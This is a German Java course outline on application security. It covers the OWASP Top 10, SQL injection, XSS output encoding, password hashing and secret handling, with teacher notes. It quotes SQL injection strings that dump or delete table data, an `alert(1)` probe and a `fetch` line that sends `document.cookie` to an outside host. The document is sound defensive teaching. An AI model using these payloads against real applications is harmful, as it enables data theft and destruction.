---
thema: security
titel: Sicherheit
voraussetzungen: [java, gradle, junit]
zielgruppe: [fortgeschritten, erfahren]
reihenfolge: 130
---

# Sicherheit

Angreifer suchen nicht die eine große Lücke, sondern die vielen kleinen, die aus
Gewohnheit entstehen: SQL mit `+` zusammengebaut, Nutzertext ins HTML geklebt, ein
Passwort im Klartext gespeichert, eine Bibliothek drei Jahre nicht aktualisiert. Dieses
Thema behandelt die Einträge der OWASP Top 10, die ein Java-Entwickler selbst in der
Hand hat – jeder mit einem Angriff, der in der Übung wirklich gelingt, bevor er
abgewehrt wird. Die Grundregel steht schon in Datenformate-Lektion 05 und gilt hier
durchgehend: Daten von außen sind Daten, keine Anweisungen.

## Lektionen

### 01 Die Landkarte: OWASP Top 10
- **Ziele:** Die zehn Kategorien im Überblick und was davon Entwicklersache ist: Broken Access Control, Injection, Kryptografie-Fehler, unsichere Konfiguration, verwundbare Komponenten, Identifikation und Authentifizierung; Angreifer-Denke: jede Eingabe ist feindlich – Formularfelder, URL-Parameter, Header, Dateien, JSON; *Defense in Depth*: mehrere Schichten, keine verlässt sich auf die andere; *Least Privilege*: der Datenbank-Nutzer der Anwendung darf keine Tabellen löschen; Fehlermeldungen nach außen ohne Stacktrace, Pfade oder SQL; Sicherheit ist Teil des Reviews (JUnit-Lektion 02), nicht ein Audit am Ende
- **Prüffrage:** Nenne drei Stellen, an denen Daten „von außen" in eine Webanwendung kommen, die kein Formularfeld sind. Und: Warum ist ein Stacktrace in einer Fehlerseite ein Sicherheitsproblem?
- **Übersetzung:** en: The map: OWASP Top 10 | fr: La carte : OWASP Top 10
- **Stufe:** 2

Leitfaden: Keine Übung – die Liste auf owasp.org gemeinsam durchgehen und je Eintrag
fragen: „Wo in unseren Übungen könnte das passieren?" Die Antworten sind die Lektionen
02 bis 04. Die Übungen dieses Themas lassen den Angriff erst gelingen: Die roten Tests
sind der Beweis, kein Vortrag.

### 02 Injection: SQL und andere Interpreter
- **Ziele:** Wie aus `"… where name = '" + name + "'"` ein Befehl des Nutzers wird: `' OR '1'='1` liest alles, `'; delete …; --` löscht; warum Maskieren und Zeichenverbote keine Lösung sind (O'Brien heißt so); **`PreparedStatement`** – der Treiber sendet SQL und Werte getrennt, die Datenbank kompiliert die Abfrage, bevor sie die Werte sieht; dasselbe in JPQL (`:name`), `JdbcTemplate` (`?`) und Spring Data (Spring-Lektion 04) – und die Falle `@Query("…" + …)`; dasselbe Muster bei jedem Interpreter: Shell (`ProcessBuilder` mit Argumentliste), LDAP, XPath, `eval`; Least Privilege als zweite Schicht
- **Übung:** uebungen/01-sql-injection
- **Prüffrage:** Warum ist `setString(1, name)` grundsätzlich sicher, während `name.replace("'", "''")` nur ein Pflaster ist? Und: Ein Kollege baut `order by " + spalte` – geht das mit einem Platzhalter, und wenn nicht, was dann?
- **Übersetzung:** en: Injection: SQL and other interpreters | fr: Injection : SQL et autres interpréteurs
- **Stufe:** 2

Leitfaden: Der Test `eingabeKannKeineZweiteAnweisungAnhaengen` leert die Tabelle
wirklich – das vorführen, nicht erzählen. Die Prüffrage zum `order by` hat keine
Platzhalter-Antwort: Spaltennamen sind keine Werte, dort hilft nur eine Whitelist.

### 03 Cross-Site Scripting und Output-Encoding
- **Ziele:** Gespeichertes XSS: Ein Nutzer schreibt `<script>`, alle anderen führen es aus – Session-Cookie, Tastatureingaben, gefälschte Login-Masken; reflektiertes XSS über URL-Parameter; **Kontext bestimmt die Maskierung**: Elementinhalt (`<`, `>`, `&`), Attribut (`"`, `'`), JavaScript, URL, CSS – OWASP Java Encoder (`Encode.forHtml`, `forHtmlAttribute`, `forJavaScript`, `forUriComponent`); maskieren beim **Ausgeben**, validieren beim Eingeben – nie HTML-maskiert speichern; was Frameworks abnehmen: Vaadin-Komponenten setzen Text, Thymeleaf `th:text` vs. `th:utext`, JavaScript `textContent` vs. `innerHTML` (JavaScript-Lektion 05); zweite und dritte Schicht: `HttpOnly`-Cookies, Content-Security-Policy
- **Übung:** uebungen/02-xss-encoding
- **Prüffrage:** Warum maskiert man beim Ausgeben und nicht beim Speichern? Und: Ein Kommentar wird in ein `onclick`-Attribut eingesetzt – reicht `Encode.forHtmlAttribute`?
- **Übersetzung:** en: Cross-site scripting and output encoding | fr: Cross-site scripting et encodage de sortie
- **Stufe:** 2

Leitfaden: Die HTML-Ausgabe der Startversion in eine Datei schreiben und im Browser
öffnen – `alert(1)` beim Überfahren des Eintrags. Dann die Frage: „Was, wenn statt
`alert` `fetch('https://…', {body: document.cookie})` drinsteht?" Die zweite Prüffrage
ist die schwere: Im `onclick` ist der Kontext JavaScript *in* einem Attribut – zwei
Maskierungen, oder besser gar kein Nutzertext an dieser Stelle.

### 04 Passwörter und Kryptografie
- **Ziele:** Warum Passwörter nie gespeichert werden – nur ein Hash; warum SHA-256 dafür falsch ist (schnell, Grafikkarten raten Milliarden pro Sekunde) und MD5 und SHA-1 ganz raus; **BCrypt** (Kostenfaktor, Salt im Hash, `$2a$10$…`) und **Argon2** (zusätzlich speicherhart, OWASP-Empfehlung); `PasswordEncoder` aus `spring-security-crypto`: `encode` und `matches`, nie zwei Hashes mit `equals` vergleichen; zufälliger Salt gegen Rainbow Tables; Kostenfaktor mitwachsen lassen, `upgradeEncoding`; Passwortregeln nach NIST: Länge statt Sonderzeichenzwang, Abgleich mit Leak-Listen, kein erzwungener Wechsel; Verschlüsselung ist etwas anderes als Hashing (umkehrbar; für Daten, die man wieder lesen muss) – nie selbst implementieren; TLS überall, auch intern
- **Übung:** uebungen/03-passwort-hashing
- **Prüffrage:** Warum können zwei Nutzer mit demselben Passwort verschiedene Hashes haben, und warum ist das wichtig? Und: Ein Kollege will die Passwörter „sicher verschlüsseln, damit wir sie bei Bedarf zurückschicken können" – was ist daran falsch?
- **Übersetzung:** en: Passwords and cryptography | fr: Mots de passe et cryptographie
- **Stufe:** 2

Leitfaden: Den gespeicherten Wert nach der Lösung anschauen und zerlegen – Algorithmus,
Kostenfaktor, Salt, Hash. Dann die Kostenfrage: `BCryptPasswordEncoder(14)` ausprobieren
und die Testlaufzeit ansehen. Das ist der Punkt: Der Angreifer zahlt denselben Preis pro
Versuch.

### 05 Abhängigkeiten, Secrets und Konfiguration
- **Ziele:** Verwundbare Komponenten: Log4Shell als Lehrstück – eine Bibliothek, jede Java-Anwendung betroffen; Abhängigkeiten prüfen (OWASP Dependency-Check als Gradle-Plugin, GitHub Dependabot, `./gradlew dependencies` zum Verstehen des Baums – Gradle-Lektion 09); Aktualisieren als Routine, nicht als Notfall; **Secrets**: nie im Repository, nie im Image, nie im Log – Umgebungsvariablen, `.env` in `.gitignore`, Plattform-Secrets in der Pipeline (Spring-Lektion 05, DevOps-Lektionen 02 und 03); was tun, wenn doch eines committet wurde (rotieren, nicht nur löschen – `git log` vergisst nicht, Git-Lektion 12); sichere Voreinstellungen: Actuator-Endpunkte nicht offen, H2-Konsole nicht in Produktion, Stacktraces aus, Security-Header; Zugriffskontrolle serverseitig prüfen, nie nur im Frontend ausblenden (Vaadin-Lektion 17)
- **Prüffrage:** Ein Datenbankpasswort wurde vor drei Wochen committet und gestern aus der Datei gelöscht – ist das Problem gelöst? Und: Warum reicht es nicht, den Admin-Button im Frontend nur für Admins anzuzeigen?
- **Übersetzung:** en: Dependencies, secrets and configuration | fr: Dépendances, secrets et configuration
- **Stufe:** 3

Leitfaden: Keine Übung – stattdessen an einer beliebigen Übung `./gradlew dependencies`
laufen lassen und gemeinsam staunen, wie viele Bibliotheken eine Spring-Boot-Anwendung
mitbringt. Dann die Frage: „Wer von euch kennt die alle?" Niemand – deshalb Werkzeuge.
